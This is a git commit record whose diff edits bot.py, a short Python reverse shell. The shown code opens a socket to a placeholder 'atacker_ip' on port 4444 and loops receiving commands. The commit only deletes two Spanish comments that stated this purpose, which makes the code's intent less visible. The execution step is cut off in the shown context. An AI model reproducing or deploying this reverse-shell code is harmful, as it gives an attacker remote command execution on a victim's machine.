72ba4e1f35fdaeac5ea99a51d370bdf657013242
Javier Lopez Garriga <101639484+yasjavi@users.noreply.github.com>
2024-01-31 15:50:35 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,11 +2,9 @@ import socket
 import subprocess
 
 def run():
-    # Crea un socket para la conexión de reverse shell
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("atacker_ip", 4444))
 
-    # Lee comandos del atacante y los ejecuta en la máquina objetivo
     while True:
         command = s.recv(1024).decode()
         if command == "exit":
